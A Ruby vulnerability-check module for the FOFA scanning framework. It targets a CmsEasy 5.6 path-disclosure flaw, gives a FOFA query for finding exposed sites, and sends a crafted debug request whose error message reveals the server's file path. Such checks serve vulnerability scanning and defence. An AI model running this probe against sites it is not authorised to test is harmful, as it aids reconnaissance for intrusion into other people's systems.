require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
    {
      "Name": "CmsEasy 5.6 index.php 网站路径泄露漏洞",
      "Description": "访问一个不存在的case，url里带入isdebug=1则可看到报错信息，其中包含网站路径",
      "Author": "bibotaixsf@msn.cn",
      "Product": "CmsEasy",
      "Homepage": "http://www.cmseasy.cn/",
      "DisclosureDate": "2016-03-19",
      "FofaQuery":"title=\"Powered by CmsEasy\" || header=\"http://www.cmseasy.cn/service_1.html\" || body=\"content=\\\"CmsEasy\"",
      "References":["https://www.seebug.org/vuldb/ssvid-91092"      ],
      "ScanSteps":[
        "AND",
        {
          "Request":
          {
            "method": "GET",
            "uri": "/index.php?case=testpath&isdebug=1",
          },
          "ResponseTest":
          {
            "type": "group",
            "operation": "AND",
            "checks": [
              {
                "type": "item",
                "variable": "$code",
                "operation": "==",
                "value": "200"
              },
              {
                "type": "item",
                "variable": "$body",
                "operation": "regex",
                "value": "No such file or directory in \\<b\\>(.*?)\\</b\\>"
              }
            ]
          }
        }
      ]
    }
  end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
